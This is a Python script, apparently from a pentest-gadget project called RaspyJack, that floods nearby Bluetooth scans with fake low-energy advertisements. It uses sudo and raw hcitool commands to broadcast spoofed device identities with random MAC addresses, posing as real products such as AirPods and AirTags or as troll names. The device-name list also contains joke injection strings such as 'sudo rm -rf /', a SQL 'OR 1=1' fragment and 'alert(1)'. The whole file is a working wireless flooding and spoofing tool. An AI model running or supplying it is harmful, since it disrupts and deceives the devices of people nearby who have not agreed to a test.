#!/usr/bin/env python3
# @name: BLE Flood
# @desc: Continuously broadcast randomized BLE advertisement identities through a selected adapter for an authorized resilience test.
# @category: bluetooth
# @danger: true
# @active: true
# @web: true
"""
RaspyJack Payload -- BLE Flood
================================
Author: 7h30th3r0n3

Flood nearby Bluetooth scans with fake devices.
Two modes:
  PRESET   Named devices (real products, hacker memes, pop culture)
  ENTROPY  Random unicode names (letters, digits, specials, emojis)

Controls:
  python3 ble_beacon_flood.py [preset|entropy] [slow|med|fast|max] [duration_seconds]

    mode      -- optional, "preset" (default) or "entropy"
    speed     -- optional, one of slow/med/fast/max (default: fast)
    duration  -- optional, seconds to flood (default: run until Ctrl-C)

  If more than one Bluetooth adapter is present, you'll be prompted to
  pick one from a numbered list.

  Ctrl-C    -- stop the flood and print a summary
"""

from payloads._web_input import request_input
import os
import sys
import random
import time
import threading
import subprocess

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

from payloads._iface_helper import list_bt_interfaces

# ---------------------------------------------------------------------------
# Fake device names
# ---------------------------------------------------------------------------
PRESET_NAMES = [
    # Real products
    "AirPods Pro", "AirPods Max", "AirPods 4", "AirTag",
    "Galaxy Buds2", "Galaxy Watch", "Bose QC45", "Bose QC Ultra",
    "JBL Flip 6", "JBL Charge 5", "Sony WH-1000", "Sony WF-1000",
    "Beats Solo", "Beats Fit Pro", "Pixel Buds", "Nothing Ear",
    "Echo Dot", "HomePod mini", "Apple Watch", "Tile Pro",
    "Mi Band 8", "Fitbit Versa", "Chromecast",
    # RaspyJack / Hacking tools
    "\U0001F480 pwned lol", "\U0001F525 ur hacked", "\U00002620 oopsie",
    "\U0001F916 beep boop", "\U0001F47E game over", "\U0001F47B boo!",
    "\U0001F4A9 oh no", "\U0001F608 hehehe", "\U0001F92F mind blown",
    "\U0001F6A8 busted!", "\U0001F512 locked out", "\U0001F4A3 boom",
    "\U0001F440 watching u", "\U0001F575 undercover", "\U0001F921 honk",
    "send memes", "pls no hack", "oui oui wifi",
    "not a virus", "trust me bro", "free robux",
    "HackRF One", "WiFi Pineapple", "Shark Jack",
    "Rubber Ducky", "Bash Bunny", "LAN Turtle",
    "Shark Jack", "Key Croc", "O.MG Cable",
    # Hacker culture
    "FBI Surveillance", "NSA Van #3", "CIA Listening",
    "MI6 Field Kit", "GCHQ Monitor", "Mossad Unit",
    "Mr. Robot", "fsociety", "Dark Army",
    "Hack The Planet", "Zero Cool", "Acid Burn",
    "Crash Override", "The Gibson", "l33t h4x0r",
    "root@kali", "sudo rm -rf /", "DROP TABLE",
    "'; OR 1=1 --", "alert(1)", "<script>hi",
    # Trolling
    "Totally Not Spy", "Not A Tracker", "Free Candy Van",
    "Definitely Safe", "Trust Me Bro", "No Virus Here",
    "Your WiFi Sucks", "Get Off My LAN", "It Burns When IP",
    "Yell PINEAPPLE", "Send Nudes", "Loading...",
    "Searching...", "Connecting...", "Error 404",
    # WiFi name memes
    "Abraham Linksys", "Bill Wi The Kid", "LAN Solo",
    "The LAN Before", "Wu Tang LAN", "Pretty Fly WiFi",
    "Silence of LANs", "LAN of the Free", "Drop It Like Hz",
    "Martin Router K", "The Promised LAN", "LAN Down Under",
    "New England Clam Router", "Hide Yo Kids WiFi",
    # Fake scary
    "Hidden Camera 4", "Smart Lock Open", "Baby Monitor",
    "Garage Opener", "Alarm Disabled", "Door Unlocked",
    "Tesla Model 3", "BMW Connected", "Audi MMI",
    # Pop culture
    "Skynet Active", "HAL 9000", "JARVIS Online",
    "FRIDAY System", "Deathstar WiFi", "Mordor Guest",
    "Hogwarts BT", "Batcave Entry", "Wakanda Tech",
    "Stark Industries", "Umbrella Corp", "Cyberdyne Sys",
    "Weyland-Yutani", "Aperture Sci", "Black Mesa",
    "Abstergo BT", "SHIELD Comm", "Wayne Ent",
    "LexCorp Device", "Dharma Init", "Los Pollos BT",
    "Dunder Mifflin", "Saul Goodman", "Heisenberg",
    "TARDIS Signal", "Sonic Screwdrv", "Matrix Node",
]

# Emoji pool for entropy mode (BLE-safe subset)
ENTROPY_CHARS = (
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    "0123456789"
    "!@#$%&*+-=<>?~"
    "\U0001F600\U0001F608\U0001F47B\U0001F480\U0001F4A3"  # grinning, devil, ghost, skull, bomb
    "\U0001F525\U0001F4A9\U0001F916\U0001F47E\U0001F47D"  # fire, poop, robot, alien, alien2
    "\U0001F512\U0001F513\U0001F6A8\U0001F6AB\U00002620"  # lock, unlock, siren, prohibited, skull&crossbones
    "\U0001F3F4\U0001F577\U0001F50D\U0001F4E1\U0001F4BB"  # pirate flag, spider, magnifying, satellite, laptop
    "\U000026A0\U000026D4\U0001F6E1\U00002622\U00002623"  # warning, no entry, shield, radioactive, biohazard
)

# Speed settings
SPEEDS = [
    ("slow", 0.15),
    ("med", 0.08),
    ("fast", 0.03),
    ("max", 0.0),
]

# ---------------------------------------------------------------------------
# State
# ---------------------------------------------------------------------------
lock = threading.Lock()
HCI_DEV = None
flooding = False
mode = 0           # 0=Preset, 1=Entropy
speed_idx = 2      # default Fast
sent = 0
last_name = ""

# ---------------------------------------------------------------------------
# HCI
# ---------------------------------------------------------------------------


def _hci_up():
    subprocess.run(["sudo", "systemctl", "stop", "bluetooth"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "hciconfig", HCI_DEV, "down"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "hciconfig", HCI_DEV, "up"],
                   capture_output=True, timeout=5)
    time.sleep(0.3)


def _send_fake_device(name):
    """Send one fake device advertisement via single bash call."""
    global last_name
    # Encode name — truncate to fit BLE adv (max ~20 bytes UTF-8)
    name_bytes = name.encode("utf-8")[:20]
    name_len = len(name_bytes)

    # Build adv data: Flags + Complete Local Name
    adv = bytearray([0x02, 0x01, 0x06, name_len + 1, 0x09])
    adv.extend(name_bytes)
    while len(adv) < 31:
        adv.append(0x00)
    adv_hex = " ".join(f"{b:02X}" for b in adv)
    data_len = f"{name_len + 5:02X}"

    # Random MAC
    mac = [random.randint(0, 255) for _ in range(6)]
    mac[0] = mac[0] | 0xC0
    mac_hex = " ".join(f"{b:02X}" for b in mac)

    # Single bash call — all HCI commands chained
    script = (
        f"hcitool -i {HCI_DEV} cmd 0x08 0x000A 00 >/dev/null 2>&1;"
        f"hcitool -i {HCI_DEV} cmd 0x08 0x0005 {mac_hex} >/dev/null 2>&1;"
        f"hcitool -i {HCI_DEV} cmd 0x08 0x0006 20 00 20 00 00 01 00 "
        f"00 00 00 00 00 00 07 00 >/dev/null 2>&1;"
        f"hcitool -i {HCI_DEV} cmd 0x08 0x0008 {data_len} {adv_hex} >/dev/null 2>&1;"
        f"hcitool -i {HCI_DEV} cmd 0x08 0x000A 01 >/dev/null 2>&1"
    )
    try:
        subprocess.run(["sudo", "bash", "-c", script],
                       capture_output=True, timeout=3)
        last_name = name
        return True
    except Exception:
        return False


def _gen_entropy_name():
    """Generate a random name with mixed chars + emojis."""
    length = random.randint(4, 12)
    return "".join(random.choice(ENTROPY_CHARS) for _ in range(length))


# ---------------------------------------------------------------------------
# Flood thread
# ---------------------------------------------------------------------------


def _flood_loop():
    global sent
    while True:
        with lock:
            if not flooding:
                break
            m = mode
            delay = SPEEDS[speed_idx][1]

        if m == 0:
            name = random.choice(PRESET_NAMES)
        else:
            name = _gen_entropy_name()

        if _send_fake_device(name):
            with lock:
                sent += 1

        if delay > 0:
            time.sleep(delay)


# ---------------------------------------------------------------------------
# Bluetooth adapter selection
# ---------------------------------------------------------------------------


def _select_bt_interface():
    """Detect BT interfaces and pick one. Prompts if more than one is found."""
    ifaces = list_bt_interfaces()

    if not ifaces:
        print("No Bluetooth adapter found.", flush=True)
        return None

    if len(ifaces) == 1:
        chosen = ifaces[0]
        if not chosen["is_up"]:
            subprocess.run(["sudo", "hciconfig", chosen["name"], "up"],
                           capture_output=True, timeout=5)
        return chosen["name"]

    print("Multiple Bluetooth adapters found:", flush=True)
    for i, ifc in enumerate(ifaces):
        mac = ifc["mac"] or "?"
        state = "UP" if ifc["is_up"] else "DOWN"
        print(f"  [{i}] {ifc['name']}  {ifc['bus'] or '?'}  {mac}  {state}", flush=True)

    while True:
        choice = str(request_input("Select Bluetooth adapter", input_type="select", choices=[
            {"value": str(i), "label": f"{item['name']} · {item.get('bus') or 'unknown'} · {item.get('mac') or 'no address'} · {'UP' if item.get('is_up') else 'DOWN'}"}
            for i, item in enumerate(ifaces)]))
        if choice.isdigit() and 0 <= int(choice) < len(ifaces):
            chosen = ifaces[int(choice)]
            if not chosen["is_up"]:
                subprocess.run(["sudo", "hciconfig", chosen["name"], "up"],
                               capture_output=True, timeout=5)
            return chosen["name"]
        print("Invalid selection, try again.", flush=True)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

_start_time = 0.0


def _usage():
    print(f"Usage: {os.path.basename(__file__)} [preset|entropy] [slow|med|fast|max] [duration_seconds]", flush=True)
    print("  mode      preset (default) or entropy", flush=True)
    print("  speed     one of: slow, med, fast, max (default: fast)", flush=True)
    print("  duration  seconds to flood (default: run until Ctrl-C)", flush=True)


def main():
    global HCI_DEV, flooding, mode, speed_idx, sent, _start_time

    args = sys.argv[1:]
    if args and args[0] in ("-h", "--help"):
        _usage()
        return 0

    duration = None

    if args and args[0].lower() in ("preset", "entropy"):
        mode = 0 if args[0].lower() == "preset" else 1
        args = args[1:]

    speed_names = [s[0] for s in SPEEDS]
    if args and args[0].lower() in speed_names:
        speed_idx = speed_names.index(args[0].lower())
        args = args[1:]

    if args:
        try:
            duration = float(args[0])
        except ValueError:
            _usage()
            return 1

    HCI_DEV = _select_bt_interface()
    if not HCI_DEV:
        return 1

    mode_name = "PRESET" if mode == 0 else "ENTROPY"
    print(f"Mode: {mode_name}  Speed: {SPEEDS[speed_idx][0]}", flush=True)
    if duration:
        print(f"Flooding for {duration:.0f}s ...", flush=True)
    else:
        print("Flooding until Ctrl-C ...", flush=True)

    flooding = True
    sent = 0
    _start_time = time.time()
    _hci_up()
    threading.Thread(target=_flood_loop, daemon=True).start()

    try:
        while True:
            time.sleep(1.0)
            with lock:
                count = sent
                dev = last_name
            elapsed = time.time() - _start_time
            rate = count / elapsed if elapsed > 0 else 0.0
            print(f"[{elapsed:6.1f}s] sent={count} rate={rate:.1f}/s last={dev!r}", flush=True)
            if duration and elapsed >= duration:
                break
    except KeyboardInterrupt:
        print("\nStopping flood...", flush=True)

    with lock:
        flooding = False
    time.sleep(0.3)

    # Disable advertising + restore bluetooth
    subprocess.run(["sudo", "hcitool", "-i", HCI_DEV or "hci0", "cmd",
                    "0x08", "0x000A", "00"],
                   capture_output=True, timeout=3)
    subprocess.run(["sudo", "systemctl", "start", "bluetooth"],
                   capture_output=True, timeout=5)

    with lock:
        count = sent

    print(f"Summary: mode={mode_name} speed={SPEEDS[speed_idx][0]} sent={count}", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
